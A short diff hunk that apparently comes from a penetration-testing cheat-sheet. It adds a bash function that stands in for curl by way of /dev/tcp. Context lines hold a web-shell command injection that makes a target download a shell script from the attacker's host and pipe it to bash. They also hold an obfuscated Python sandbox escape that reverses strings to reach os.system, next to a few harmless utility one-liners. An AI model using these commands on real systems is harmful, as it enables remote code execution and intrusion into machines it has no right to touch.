@@ -236,6 +236,7 @@ don't do this: curl http://$IP/cmd.php?cmd=curl http://$SELF/shell.sh|bash ... (
 curl http://$IP/cmd.php --data-urlencode 'cmd=curl http://$SELF/shell.sh|bash'
 svn export https://github.com/repo.git/trunk/<folder to download>
 echo -n '+'|jq -Rr @uri
+curl() { { printf "GET /${3} HTTP/1.1\r\nHost: $1\r\nConnection: close\r\n\r\n" >&3; cat <&3; } 3<>/dev/tcp/$1/${2:-80}; }
 
 # Python3 Sandbox Bypasses
 getattr(getattr(globals()['__snitliub__'[::-1]], '__tropmi__'[::-1])('so'[::-1]),'metsys'[::-1])('ls')
